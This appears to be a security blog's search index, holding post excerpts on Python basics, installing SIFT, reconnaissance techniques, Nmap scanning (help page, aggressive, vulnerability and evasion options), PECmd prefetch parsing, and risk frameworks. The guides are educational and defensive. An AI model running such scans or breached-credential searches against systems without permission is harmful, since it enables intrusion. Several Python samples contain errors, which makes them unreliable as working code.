and other resources. Python contains an already extensive library which can be accessed natively, more information can be found at The Python Standard Library Documentation. More advanced or third-party modules can be found at the PyPI · The Python Package Index, which maintains a repository of software for the Python Language:Importing a Standard ModuleThe below example imports the ‘random’ module into Python for use, the Random module implements pseudo-random number generators.import randomModule FunctionsModules will typically contain functions that allow for actions to be performed. To call a function within a module, first explicitly call the module and then select a function, Visual Studio and other IDEs will populate a list of available functions.The below example uses a function within the random module to generate a random integer between the numbers 1 and 6 which are set as arguments to the instruction. The value is then stores and is callable via the ‘roll’ variable.roll = random.randint(1,6)Using the random module as an example again, we can see that there a numerous function available via the random — Generate pseudo-random numbers document by Python.choices = [\"rock\", \"paper\", \"scissors\"]computer_choice = random.choice(choices)Installing Third-Party PackagesApart from the extensive libraries available by default with Python, there exist a vat number of specialized packages that have been created by the Python community to extend the capabilities of modules. As previously mentioned, a repository of these packages can be found at PyPI · The Python Package Index, and also via custom repositories on GitHub.To install third-party packages, the Python Install Package (PIP) is required, PIP manages the installation of packages from the Python Package Index and can be interacted with via the Python Terminal. In the below example, the package ‘requests’ is downloaded and installed via PIP. The Requests package allows HTTP requests to be made to webservers in order to interact with APIs and retrieve/post data.pip --version # Returns the version of PIP installedpip install requestspip --upgrade requests # If already installed, packages can be upgradedOnce installed, a package can then be imported and used in the same manner as built-in modules or libraries. In the example below, the requests package is used to make an outbound connection to a webserver https://randomuser.me/api/, returning and parsing the data in .json format.import requestsretrieve = requests.get('https://randomuser.me/api/')output = retrieve.json()print(output)An example is shown below of a practical use of the requests package. User information is retrieved from the webserver and parsed to print the username and password. Due to the JSON data being quite overwhelming, online tools such as JSON Parser can be used to break the dictionaries and lists into a more readable format.import requestsretrieve = requests.get('https://randomuser.me/api/')output = retrieve.json()login = output.get('results')[0].get('login')print(\"Username is: \", login.get('username'))print(\"Password is: \", login.get('password'))In some circumstances, an API key may be required when interacting with a webserver. In such circumstances, the following can be included in the code. Some webservers will provide instructions on how to structure API calls, including the specific implementation of the API key.import requestsapi_key = \"asdfklj43po587sadkfjn3487\"city = \"Narnia\"url = \"https://api.locationweather.org/data/weather?q=\"+city+\"&amp;appid=\"+api_keyretrieve = weather.get(url)json = weather.get()print(json)Virtual Environments and PackagesIn some circumstances, packages and modules may require specific versions of libraries in order to function. This means that one Python installation may not meet the requirements of every application. The solution is to create a self-contained directory contain specific versions of Python and the required packages. This self-contained Python structure is called a virtual environment (VENV).To create a virtual environment, the following command is run to create a standalone environment called ‘example’python -m venv example # A file path such as \"C:\\Python\\Venv\\example\" can also be usedOnce the virtual environment has been created, the next step is to set the environment to be used instead of the local Python instance. To activate and deactivate a virtual environment, the following commands can be run on Windows. Once the PowerShell script is run, the venv name, in this case ‘example’ will be highlighted at the beginning of the terminal. Deactivating is done by executing the deactivate batch script and by running exit on the Python terminal.C:\\Python\\Venv\\example\\Scripts\\activate.ps1C:\\Python\\Venv\\example\\Scripts\\deactivate.batWhen operating inside of the virtual environment, instructions and commands are as they would be if using the Python instance installed on the host. Once a virtual environment is no longer required, they can be deleted from disk, an empty environment takes up around 15-20MB of space.Logical Statements (IF and ELSE)Programs utilize logical statements to determine execution of code based on conditions. For example, if an condition is true do this, or is false do that.IF StatementsIF statements are made up of two parts, the IF keyword followed by a condition and colon (:). The example below is a basic statement that only has one condition, if the condition is met a string will be returned to the console using the ‘print’ function.age = 33if age &gt; 29: print('''You're in your thirties!''')Additional conditions can be added to logical statements in what is referred to as a ‘block’ of code. A block is simply a set of statements. In the below example, additional print functions will be executed upon the condition being met. Note that there are 4 spaces between the starting line and the beginning of the function. Python uses whitespace (singles spaces or tab) to create blocks, code that is in the same position will be grouped, every positional change will create a new group.age = 33if age &gt; 29: print('''You're in your thirties!''') print('''Thats not great''')If statements can be used to check data types such as the below example which checks a list for a specific value.acronyms = ['HTTPS', 'SSL', 'TLS']user_input = 'HTTPS'if user_input in acronyms: print(user_input + \"Is an encypted channel\")IF-then-ELSE StatementsThe above IF statements only perform an action when the condition is true. IF-then-ELSE statements can be introduced to creation actionable conditions for statements that are true or false.age = 33if age &gt; 29: print('''You're in your thirties!''') print('''Thats not great''')else: print('''You're still young, cherish it''')IF and ELIF StatementsLogical conditions can be extended even further using ELIF (else-if). Unlike the IF-then-ELSE statement which relies of a condition being met once and everything else being treated as false, ELIF can provide more verbose conditioning.age = 33if age &gt; 29: print('''You're in your thirties!''') print('''Thats not great''')elif age &lt; 29: print('''You're still young, cherish it''')elif age &gt; 39: print(\"Yikes!\")else: print('''Weow! You're actually ancient''')Combining ConditionsConditions can be combined by using keywords ‘and’ and ‘or’ to provide shorter and simpler code, both statements must be true for an and statement to be true in the below example. Or only requires one of the conditions to be true.age = 24if age =&gt; 20 and age &lt; 30 print('''You're in your twenties''')colour = \"red\"if colour == \"red\" or colour == \"yellow\" print('''Stop''')LoopsLoops are used to carry out an instruction or set of instructions over a data set. The below example depicts a simple for loop that will print each value within the protocols list. the variable ‘p’ acts as a temporary variable to store the protocols in for each run of the loop.protocols = ['HTTP', 'HTTPS', 'FTP', 'SSH']for p in protocols: print(p)Loops often make use of Ranges to create lists that can be populated based upon user input, such as the example below.study_hours = []x = int(input(\"How many days of study did you perform this week?\\n\"))for i in range(x): study_hours.append(float(input(\"Enter the amount of hours for each day:\\n\"))) total = sum(study_hours)print(\"Your total amount of study hours this week is: \", total)Loops can be used with the Dictionary data type also, including dictionaries that contained lists. By default however, when a dictionary is printed using a loop it will only return the key and not the attached value. To return both the key and value pair, the below loop can be used. Note that the method .items is used to return the key and value pair.traffic = {'Allowed': ['HTTP', 'HTTPS'], 'Blocked': ['FTP', 'SSH']}for v, k in traffic.items(): print(v, ':', k)More granular calls can be made to return specific data from nested dictionaries also, such is the example below which contains a dictionary ‘contacts’ containing a key ‘students’ with a nested dictionary containing key and value pairs for ‘name’ and ‘email’. The example depicts how to use a loop to return the ‘email’ from the nested dictionary.contacts = { \"number\":2, \"students\": [ {\"name\":\"Harry Potter\", \"email\":\"hpotter@gmail.com\"}, {\"name\":\"Ronald Weasley\", \"email\":\"rweasley@gmail.com\"} ]}for s in contacts[\"students\"]: print(s[\"email\"])The above example discuss the ‘for’ loop which is great when a loop is running over a specific length, such as the range inclusions. There is another type of loop however than will run until a specific condition is met, called a ‘while’ loop.brute_force = 0while brute_force &lt; 10000 print(brute_force) if authentication == True: break elif locked_out == True: break else: brute_force = brute_force + 1" }, { "title": "Building SIFT Workstation on Ubuntu 20.04 LTS", "url": "/posts/Installing_SIFT_Workstation/", "categories": "General IT and Security, Engineering", "tags": "SIFT", "date": "2022-09-12 00:00:00 +1000", "snippet": "The good folks at SANS Institute have put together and maintain a pre-configured collection of tools to assist DFIR analysts in their war against the cyber baddies. If you’ve taken one of SANS DFIR training courses, you’re likely familiar with SIFT. For those that haven’t and would like to test it out, SIFT contains some great open-source tools to support many forensic tasks.SANS do offer a preconfigured VM ready for download at this link, SIFT Workstation Download. However this version is somewhat behind the times, my preferred method is to create a template SIFT machine based off of a fresh Ubuntu VM, and I also run SIFT on my WIN11 machine on server mode through Ubuntu WSL, but that’s for another day.Alas, after a very brief introduction in assuming the reader, you, already knows what the SIFT environment has to offer. Lets get to the process of creating an Ubuntu VM and installing the thing!Installing Ubuntu 20.04 LTSThe current SIFT version is only supported by Ubuntu 20.04 Desktop/Server editions with this procedure being carried out on the latest distribution available from Ubuntu. Following the wizard setup for the hypervisor software of your choosing (I use and prefer VMware Workstation Pro 16 – Because dark mode!) Configuration and customization is fairly straight forward at this point, the SIFT install takes up roughly 60GB worth of precious HDD space so ensure you allocate enough storage when setting up the VM. My recommendation is to increase Memory to at least 16GB (for processing the timelines and memory things), more processors (much brain), remove the printer and sound card. Circling back to storage, depending on how you run investigations, you can assign a maximum disk size that can hold investigation data (1TB???) or, as i do, simply mount and evidence drive and utilize an external SSD to store case files. The next part is super fun! You can grab a beer (or coffee depending on what time of day it is) and watch as the Ubuntu installer does it thing! Once the beer is finished, grab another one and then await the completion of the install. Finally once it is complete and you’re presented with the desktop view, the very first thing we must do is remove the help icon from the favorites menu, because we simply don’t need it… We’re adults. Now, as the good security conscious people that we are I will safely assume that you know what to first do when installing a new OS (if not, it’s updates). If you’re spending the time to read this, there is a fair chance that the software updater has already prompted you, If not, or you’re new to the Linux Terminal’ator just copy and paste this after pressing CTRL+ALT+T and once done, remove from the oven and restart the boi for good measure. sudo apt-get update &amp;&amp; sudo apt-get upgrade &amp;&amp; sudo dist-upgrade sudo autoremove Installing SIFT-CLI For those still with me, we know need to install the SIFT CLI package in order to install and maintain our SIFT environment. So head on onto the teamdfir github page and download the latest release files. Install cosign and Validate the signature cosign verify-blob --key sift-cli.pub --signature sift-cli-linux.sig sift-cli-linux Move the file to /usr/local/bin/sift and change the permissions of this little fella to ensure it runs to the best of his ability sudo mv sift-cli-linux /usr/local/bin/sift &amp;&amp; chmod 755 /usr/local/bin/sift Installing SIFT via SIFT-CLI Alright, now the sift-cli should be ready to go. in good practice type sift –help to see the manual. And proceed to the next beer because we’ve got another little while of waiting whilst the SIFT package installs. Have you got your beer ready? Ok, now the last command is the package install sudo sift install. Once complete, make a snapshot and you’re good to track down those pesky hack0rz." }, { "title": "Reconnaissance", "url": "/posts/Reconnaissance/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "reconnaissance (TA0043), active scanning (T1595)", "date": "2022-09-12 00:00:00 +1000", "snippet": "OverviewGathering information on target infrastructure, operations, and personnel.Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts. 1TechniquesDifferent techniques can be used when conducting reconnaissance against a target or targets to identify hosts, networks, and users. Mapping a targets infrastructure and and environment conditions allows an attacker to uncover weaknesses that can provide a high chance of being exploitable. Generally, reconnaissance can be classified into the below categories: Infrastructure Gaining intelligence surrounding the physical and digital infrastructure of the target. IP Addresses, physical security controls, domains, technologies, etc Environmental Gaining intelligence on the targets organization operational details. Email and User nomenclature, website scraping, document parsing, etc Users Gaining intelligence on specific user weaknesses Breached credential searches, social media searches, etc Vulnerabilities Scanning infrastructure to identify potentially exploitable conditions Investigation on avenues to exploit identified conditions Passive Scanning and Open Source Intelligence (OSINT)Adversaries may execute passive reconnaissance via services or gather information from open source repositories that can be used for target profiling. Typically passive reconnaissance will be near impossible to attribute back to an actor. Detection Mitigation Threat Hunting Passive scanning is outside of internal defensive scopes, however reviews of externally passive scanning and OSINT sources including employee password breaches can help Identifying Target InfrastructurePassive reconnaissance can be performed against a target or in an attempt to identify a potential target by searching for information such as IP address spaces, domains, subdomains, services, etc.Tools Shodan Censys Crt - Certificate Search Netcraft - Webserver Infrastructure Built With - Webserver Infrastructure WappAlyzer - Webserver Infrastructure WhatWeb - Webserver Infrastructure Sublist3r - Subdomain EnumerationDiscovering Email AddressesIdentifying the email addresses of key contacts within an organization can be a valuable method to scope potential targets. There are a variety of different methods to scope email accounts and personnel attached to a target, even identifying things such as management structures, work hours, phone numbers, and much more from a single name or email address.Tools HunterDiscovering Breached CredentialsHistoric and new collation of breached credentials contain millions of username, email, and password combinations resulting from user database breaches and hacks. Collating information contain across multiple breaches can provide password patterns for users with multiple breaches making password guessing easier. Some dumps main contain clear-text credentials and others may contain hashed credentials that will require further processing to use or decrypt.Tools Breach Parse DeHashed Have I Been Pwned?Active Scanning 2Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction. Scanning can be achieved via several categories such as port scanning, vulnerability scanning, and wordlist scanning to name a few of the most common. Detection Mitigation Network Traffic Scanning is outside of internal defensive scopes, however reviews of externally facing ports and services should regularly be monitored Tools Scanning IP Blocks Darkcybe - Nmap Guide Vulnerablity Scanning Darkcybe - Nmap Guide [Darkcybe - Nessus Guide] Comming Soon [Darkcybe - Nikto Guide] Comming Soon Wordlist Scanning Darkcybe - Nmap Guide [Darkcybe - Dirbuster Guide] Comming Soon Gather Victim Host Information 3Adversaries may gather information about the victim’s hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).Sources MITRE ATT&amp;CK - Reconnaissance TA0043 &#8617; MITRE ATT&amp;CK - Reconnaissance: Active Scanning T1595 &#8617; MITRE ATT&amp;CK - Reconnaissance: Gather Victim Host Information T1592 &#8617; " }, { "title": "Nmap", "url": "/posts/ETH_Tools_Nmap/", "categories": "Ethical Hacking Tools, Reconnaissance", "tags": "nmap, reconnaissance (TA0043), active scanning (T1595), nse", "date": "2022-09-12 00:00:00 +1000", "snippet": "“Nmap (“Network Mapper”) is a free and open source utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X.” - nmap.orgIt is perhaps the most utilized tool when initiating a pentest or challenge for a CTF event and is also used for system administration purposes to map network devices. Nmap can be found on popular pentesting environments natively such as Kali Linux and ParrotOS. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique Nmap V7.92 Reconnaissance Active Scanning Nmap Help Pageroot@kali:~# nmap -hNmap 7.92 ( https://nmap.org )Usage: nmap [Scan Type(s)] [Options] {target specification}TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL &lt;inputfilename&gt;: Input from list of hosts/networks -iR &lt;num hosts&gt;: Choose random targets --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks --excludefile &lt;exclude_file&gt;: Exclude list from fileHOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each hostSCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags &lt;flags&gt;: Customize TCP scan flags -sI &lt;zombie host[:probeport]&gt;: Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b &lt;FTP relay host&gt;: FTP bounce scanPORT SPECIFICATION AND SCAN ORDER: -p &lt;port ranges&gt;: Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging)SCRIPT SCAN: -sC: equivalent to --script=default --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts --script-args-file=filename: provide NSE script args in a file --script-trace: Show all data sent and received --script-updatedb: Update the script database. --script-help=&lt;Lua scripts&gt;: Show help about scripts. &lt;Lua scripts&gt; is a comma-separated list of script-files or script-categories.OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressivelyTIMING AND PERFORMANCE: Options which take &lt;time&gt; are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T&lt;0-5&gt;: Set timing template (higher is faster) --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies probe round trip time. --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions. --host-timeout &lt;time&gt;: Give up on target after this long --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per secondFIREWALL/IDS EVASION AND SPOOFING: -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU) -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys -S &lt;IP_Address&gt;: Spoof source address -e &lt;iface&gt;: Use specified interface -g/--source-port &lt;portnum&gt;: Use given port number --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies --data &lt;hex string&gt;: Append a custom payload to sent packets --data-string &lt;string&gt;: Append a custom ASCII string to sent packets --data-length &lt;num&gt;: Append random data to sent packets --ip-options &lt;options&gt;: Send packets with specified ip options --ttl &lt;val&gt;: Set IP time-to-live field --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksumOUTPUT: -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename. -oA &lt;basename&gt;: Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --append-output: Append to rather than clobber specified output files --resume &lt;filename&gt;: Resume an aborted scan --noninteractive: Disable runtime interactions via keyboard --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML outputMISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir &lt;dirname&gt;: Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page.EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLESInstructionsPerforming ScansNmap scans networked devices based on 9 scan phases, that include; Target Enumeration, Host Discovery, Reverse-DNS Resolution, OS Detection, Version Detection, Port Scanning, Traceroute, Script Scanning (using the Nmap Scripting Engine (NSE)) and finally, output. Command switches are used to modify those phases for more simplified and passive, or complex and aggressive scanning. Some basic scans that are useful for system discovery are as below:# Scan a host for a single portnmap -p22 &lt;IP ADDRESS&gt;# Scan a subnet for active hosts via ping scan and output to a filenmap -sn -oA &lt;output Name/Directory&gt; &lt;IP ADDRESS&gt;/CIDR# Scan a host, enabling OS detection, version detection, script scanning, and traceroute with verbose outputnmap -v -A &lt;IP ADDRESS&gt; or &lt;DOMAIN&gt;Performing Complex ScansAs mentioned above, Nmap has the ability to conduct complex and aggressive scanning which can be very useful for internal security teams and penetration testers alike. Some handy scans are as below:# Scan a host across ports 1-1023 and ports that are mapped to services, enabling OS detection, version detection, script scanning (default scripts), and traceroute with formatted outputnmap -sC -sV -p1-1023,[1024-] &lt;IP ADDRESS&gt; or &lt;DOMAIN&gt;# Scan a host with aggressive detection, in fast mode, and across all portsnmap -A -T4 -p- &lt;IP ADDRESS&gt;# Scan a host and return vulnerability listings using NSEnmap -sC --script=vulners &lt;IP ADDRESS&gt;# Scan a web server and retrieve banner information via NSEnmap -sC --script=http-enum &lt;IP ADDRESS&gt; There are over 600 pre-packaged scripts and many more available through third-party repositories. By Default on Linux installs, scripts are kept in the directory /usr/share/nmap/scripts.Searching the NSE DatabaseThere are numerous pre-packaged scripts that ship default with Nmap, with additional extensions or specialized scripts able to be created or downloaded via repositories such as GitHub. The following are a few more precise commands that can be used to interact with the script database# Searching the NSE Databasenmap --script-help \"smb-*\" | grep \"^smb-\"# Displaying Script Helpnmap --script-help \"smb-os-discovery\"Additional InfoZenMapNmap provides a GUI frontend for the application called ZenMap. Commands are still entered as previous examples display, however the GUI interface can display network topology information in a graphical view.Analyzing OutputNmap scan report for 10.20.30.40Host is up (0.0081s latency).Not shown: 989 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-14 04:20:69Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: dark.cybe, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: dark.cybe, Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required| smb2-time: | date: 2022-08-14T05:30:32|_ start_date: N/A From the example above are several open ports, with Nmap attributing Service and Version details based on header details returned by the target host. This information can provide valuable insight into the hosts role, potential vulnerabilities, targets for further enumeration consequently and attack entry points. Based on the above port details, we can ascertain the the server 10.20.30.40 is a Domain Controller, with ports relating to Kerberos and LDAP being observed. The trailing section details Nmap script execution details that identify that SMB version 3.1.1 is in use on the host.Sources Nmap.org Kali Linux Tools NSE Doc Reference Portal" }, { "title": "PeCmd", "url": "/posts/DFIR_Tools_Execution_PeCmd/", "categories": "DFIR Tools, Program Execution", "tags": "pecmd, prefetch, execution (T0002)", "date": "2022-09-12 00:00:00 +1000", "snippet": "OverviewPECmd is a command line tool developed by Eric Zimmerman, to process Prefetch files (.pf) on Windows operating systems, identifying items such as: Volume information Files and Directories referenced Executions time (up to last 8 for Win8+) Total execution countPECmd can output the parsed prefetch files into .csv, json and HTML formats for further analysis. It should be noted that Windows Servers do not have prefetch enabled by default, information on enabling this service can be found on Darkcybe - Evidence of Execution Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique PeCmd V1.5 Execution   InstructionsParsing a Single Prefetch FileParses the prefetch file for bad.exe and writes the output to a .csv file for further analysis. A single entry will be returned to STDOUTPECmd.exe -f \\PATH\\TO\\bad.exe-2222BD1A.pfOutputParsing all Prefetch Files within a DirectoryParses all prefetch files within a supplied directory. The example depicts parsing all .pf files within the default Windows prefetch directory and writes the output to a .csv file for further analysis. The q switch prevents the tool from printing the results to STDOUT. Two files will be output, a standard parsing of the entries Prefetch directory and a second timeline view of individual application executions.PECmd.exe -d “E:\\Windows\\Prefetch” –csv “G:\\Cases\\001\\Suspect_Machine_1\\Prefetch_all.csv -q Interesting Fields SourceCreated = .pf Creation Timestamp SourceModified = .pf Modification Timestamp SourceAccessed = .pf Last Access Timestamp (Will be overwritten by tooling) ExecutableName = Name of executable RunCount = Amount of times executed LastRun = Timestamp of last execution PreviousRun# = Timestamps of previous executions Output Date/Time of ExecutionPrefetch files are created roughly ~10 seconds after an executable is executed, therefore the modification (last execution) and creation (first execution) DTG’s may be 10 seconds after displayed times on the prefetch listings.Sources Eric Zimmerman" }, { "title": "Cybersecurity Risk Frameworks", "url": "/posts/Frameworks_and_Orgs/", "categories": "General IT and Security, Resources", "tags": "", "date": "2022-09-11 00:00:00 +1000", "snippet": "Cybersecurity Risk and Risk ManagementCybersecurity risk refers to the potential for harm to an organization’s assets, such as data, systems, and networks, as a result of cyber threats. Cyber threats can include activities such as hacking, malware, phishing, and ransomware attacks, and they can have serious consequences for organizations, such as data breaches, financial losses, and damage to reputation.Cybersecurity risk is typically measured in terms of the likelihood of a particular threat occurring and the impact it would have on the organization if it did occur. Organizations can take a variety of measures to manage their cybersecurity risks, such as implementing strong passwords, installing antivirus software, and training employees on cybersecurity best practices.Cybersecurity risk management is the process of identifying, assessing, and mitigating risks to an organization’s assets, such as data, systems, and networks. Here are some common areas of cybersecurity risk management: Risk assessment: This involves identifying potential risks to the organization’s assets and evaluating their likelihood and impact. Risk treatment: This involves choosing appropriate measures to mitigate identified risks. These measures can include technical controls, such as firewall and antivirus software, as well as non-technical controls, such as employee training and policies and procedures. Security controls: These are measures that are put in place to protect the organization’s assets from cyber threats. Examples include firewalls, antivirus software, and intrusion detection and prevention systems. Incident response: This involves having a plan in place for responding to cyber incidents, such as data breaches or ransomware attacks. This plan should include steps for containing the incident, analyzing the impact, and restoring affected systems. Risk communication: This involves sharing information about cybersecurity risks and incidents with stakeholders, such as employees, customers, and regulators. Risk governance: This involves establishing processes and procedures for managing cybersecurity risks within the organization. This can include setting up a risk management committee, establishing policies and procedures, and regularly reviewing and updating risk management processes.Cybersecurity Risk FrameworksA cybersecurity risk framework is a set of guidelines or best practices that organizations can use to manage their cybersecurity risks. There are many different cybersecurity risk frameworks that organizations can choose from, each with a different focus and level of detail. Some common cybersecurity risk frameworks include: NIST Cybersecurity Framework (CSF) ASD Essential Eight CIS Top Critial Controls COBIT 5 ISO 2700X Series PCI DSS (Payment Card Industry Data Security Standard) HIPAA (Health Insurance Portability and Accountability Act) Cybersecurity Maturity Model Certification (CMMC) SANS Critical Security Controls NIST SP 800-53These are just a few examples, and there are many other cybersecurity risk frameworks that organizations can use. The best framework for a particular organization will depend on its specific needs and goals, as well as its industry and regulatory requirements.Below is are some of the more mature frameworks that can assist in developing robust protections of an organizations network: NIST Cybersecurity Framework (CSF) - Developed by the National Institute of Standards and Technology (NIST), this framework provides guidance for organizations to manage their cybersecurity risks. It consists of five core functions: Identify, Protect, Detect, Respond, and Recover. ASD Essential Eight - Developed by the Australian Signals Directorate (ASD), this framework consists of eight critical mitigations that organizations can implement to reduce their cybersecurity risks. The eight mitigations are: application whitelisting, patching applications, patching operating systems, restricting administrative privileges, application sandboxing, disabling unnecessary services, enabling multifactor authentication, and using virtual private networks (VPNs). CIS Top Critical Controls - developed by the Center for Internet Security (CIS), this framework consists of 20 critical controls that organizations can implement to reduce their cybersecurity risks. The controls are divided into two categories: basic and advanced. COBIT 5 - Developed by the Information Systems Audit and Control Association (ISACA), this framework provides guidance for the governance and management of information and technology. It consists of five principles: meeting stakeholder needs, covering the enterprise end-to-end, applying a single integrated framework, enabling a holistic approach, and separating governance from management. ISO 27001 - Developed by the International Organization for Standardization (ISO), this standard provides guidance for the establishment, implementation, maintenance, and improvement of an information security management system (ISMS). It consists of 14 clauses that cover different aspects of information security, including risk assessment and treatment, asset management, and incident management. ISO 27002 - Developed by the International Organization for Standardization (ISO), this standard provides guidelines for the implementation of an information security management system (ISMS). It covers a wide range of information security topics, including risk assessment and treatment, asset management, and incident management." }, { "title": "Ethical Hacking Overview", "url": "/posts/ETH_Overview/", "categories": "Ethical Hacking", "tags": "", "date": "2022-09-11 00:00:00 +1000", "snippet": " Using any tools, tactics, or techniques mentioned in this repository on infrastructure that you do not own or do not have express permission to perform tasks on is strictly prohibited. Such actions may be illegal and can have serious consequences, including damaging the infrastructure and potentially causing harm to others. Before using any of the tools listed in this repository, it is essential that you check local and corporate policies and regulations to ensure that your actions are authorized and compliant. If you are uncertain about the legality or appropriateness of your actions, it is highly recommended that you seek advice from a qualified professional or consult relevant policies and regulations. The Darknet Diaries podcast and a quick google search can provide valuable information on the consequences of unauthorized activities.OverviewThe term hacker often conjures up negative stereotypes, such as the image of an individual in a basement wearing a black hoodie, typing away at a computer while listening to techno music and attempting to hack into the mainframe of the NSA through Doritio stain fingers. However, this stereotype is not accurate. Hacking can take many forms, from the lone hacker causing mischief for fun and attention, to more practical applications such as penetration testing or red team analysis. Regardless of the role, the core essence of hacking is identifying weaknesses and attempting to exploit them.The posts in the “Ethical Hacking” category will provide information and guidance on hacking techniques, tools, and methodologies that can be used for legal penetration testing and capture the flag competitions. Ethical hacking refers to the legal identification and exploitation of vulnerabilities on target systems. It is important to note that unauthorized hacking is illegal and can have serious consequences. Therefore, it is essential to follow all relevant laws and policies when using any hacking tools or techniques.Types of HackersThere is an established method of categorizing hackers based on the old ‘hat’ scenario. Black Hat Hackers: These are individuals who engage in illegal hacking activities, often for personal gain or to cause harm. White Hat Hackers: Also known as ethical hackers, these are individuals who use their hacking skills for defensive purposes, such as testing an organization’s security systems to identify vulnerabilities that need to be fixed. Grey Hat Hackers: These are individuals who may sometimes engage in illegal hacking activities, but also sometimes use their skills for defensive purposes. Blue Hat Hackers: These are individuals who are not professional hackers, but may engage in hacking as a hobby or to test their own systems or networks. Script Kiddies: These are individuals who use pre-written scripts or tools to hack into systems, often without understanding how they work.Ethical Hacking ProcessThe stages of an ethical hacking process may include: Planning and reconnaissance: This stage involves gathering information about the target system or network, such as its infrastructure, technology, and security measures. This may include activities such as network scanning, vulnerability assessments, and social engineering. Scanning and enumeration: In this stage, the hacker uses tools and techniques to identify vulnerabilities and gather further information about the target system or network. This may include activities such as port 